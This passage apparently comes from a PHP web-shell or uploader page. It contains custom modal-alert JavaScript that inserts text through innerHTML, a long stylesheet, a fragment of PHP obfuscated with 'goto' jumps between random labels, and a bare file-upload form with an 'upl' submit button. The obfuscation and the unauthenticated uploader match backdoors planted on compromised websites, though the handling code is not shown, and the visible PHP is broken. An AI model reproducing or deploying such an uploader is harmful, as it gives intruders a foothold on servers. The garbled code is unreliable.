	d = document;
	if (d.getElementById("modalContainer")) return;
	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
	mObj.id = "modalContainer";
	mObj.style.height = d.documentElement.scrollHeight + "px";
	alertObj = mObj.appendChild(d.createElement("div"));
	alertObj.id = "alertBox";
	if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
	alertObj.style.visiblity = "visible";
	h1 = alertObj.appendChild(d.createElement("h1"));
	h1.appendChild(d.createTextNode(ALERT_TITLE));
	msg = alertObj.appendChild(d.createElement("p"));
	//msg.appendChild(d.createTextNode(txt));
	msg.innerHTML = txt;
	btn = alertObj.appendChild(d.createElement("a"));
	btn.id = "closeBtn";
	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
	btn.href = "#";
	btn.focus();
	btn.onclick = function() { removeCustomAlert(); return false; }
	alertObj.style.display = "block";
}

function removeCustomAlert() {
	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
}
</script>
<style type="text/css">
#modalContainer {
	background-color: rgba(0, 0, 0, 0.3);
	position: absolute;
	width: 100%;
	height: 100%;
	top: 0px;
	left: 0px;
	z-index: 10000;
	/* required by MSIE to prevent actions on lower z-index elements */
}

#alertBox {
	position: relative;
	width: 300px;
	min-height: 100px;
	margin-top: 50px;
	border: 1px solid #666;
	background-color: #fff;
	background-repeat: no-repeat;
	background-position: 20px 30px;
}

#modalContainer>#alertBox {
	position: fixed;
}

#alertBox h1 {
	margin: 0;
	font: bold 0.9em verdana, arial;
	background-color: #3073BB;
	color: #FFF;
	border-bottom: 1px solid #000;
	padding: 2px 0 2px 5px;
}

#alertBox p {
	color: red;
	height: 50px;
	padding-left: 5px;
	margin-left: 55px;
}

#alertBox #closeBtn {
	display: block;
	position: relative;
	margin: 5px auto;
	padding: 7px;
	border: 0 none;
	width: 70px;
	font: 0.7em verdana, arial;
	text-transform: uppercase;
	text-align: center;
	color: #FFF;
	background-color: #357EBD;
	border-radius: 3px;
	text-decoration: none;
}


/* unrelated styles */

#mContainer {
	position: relative;
	width: 600px;
	margin: auto;
	padding: 5px;
	border-top: 2px solid #000;
	border-bottom: 2px solid #000;
	font: 0.7em verdana, arial;
}

h1,
h2 {
	margin: 0;
	padding: 4px;
	font: bold 1.5em verdana;
	border-bottom: 1px solid #000;
}

code {
	font-size: 1.2em;
	color: #069;
}

#credits {
	position: relative;
	margin: 25px auto 0px auto;
	width: 350px;
	font: 0.7em verdana;
	border-top: 1px solid #000;
	border-bottom: 1px solid #000;
	height: 90px;
	padding-top: 4px;
}

#credits img {
	float: left;
	margin: 5px 10px 5px 0px;
	border: 1px solid #000000;
	width: 80px;
	height: 79px;
}

.important {
	background-color: #F5FCC8;
	padding: 2px;
}

.main {
	width: 100%;
	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
}

.vn-nav ul {
	margin: 0;
	padding: 0;
	list-style-type: none;
	list-style-image: none;
}

.vn-nav li {
	margin-right: 0px;
	display: inline;
}

.vn-nav ul li a {
	text-decoration: none;
	margin: 0px;
	padding: 15px 20px 15px 20px;
	color: #ffffff;
}

.vn-nav li.current-menu-item a {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.vn-nav li.current_page_item {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.modalDialog {
	position: fixed;
	font-weight: bold;
	font-family: 'Agency FB';
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgba(0, 0, 0, 0.8);
	z-index: 99999;
	opacity: 0;
	-webkit-transition: opacity 400ms ease-in;
	-moz-transition: opacity 400ms ease-in;
	transition: opacity 400ms ease-in;
	pointer-events: none;
}

.modalDialog:target {
	opacity: 1;
	pointer-events: auto;
}

.modalDialog>div {
	width: 500px;
	height: auto;
	position: relative;
	margin: 5% auto;
	padding: 5px 20px 13px 20px;
	background: #34495e;
	color: #fff;
}

.close {
	background: #2c3e50;
	color: #16a085;
	padding: 5px;
	position: right;
	right: -55px;
	text-align: center;
	top: 0;
	width: auto;
	float: left;
	text-decoration: none;
	font-weight: bold;
}

.close:hover {
	background: #2c3e50;
	color: #e74c3c
}

.vn-green a {
	background: #27ae60;
	padding: 10px;
	color: #fff;
}

.vn-green a:hover {
	color: red;
	background: #21894d;
	text-decoration: none;
}
</style>
<script type="text/javascript">alert(<?php  goto ONmgf;
     terM6: ?>);</script>
<?php  goto lgIu4;
     lgIu4:
 } goto acC90; qkhAz: CJNkO: goto nYmSZ; bM1qs: Guyes: goto Dn0ba; Y4e5u: ?>
	<form method="post" enctype="multipart/form-data">
		<center>
			<input class="btn" type="file" name="file" />
			<input class="btn btn-danger" name="upl" type="submit" value="Save">
		</center>
	</form>
</body>
</html>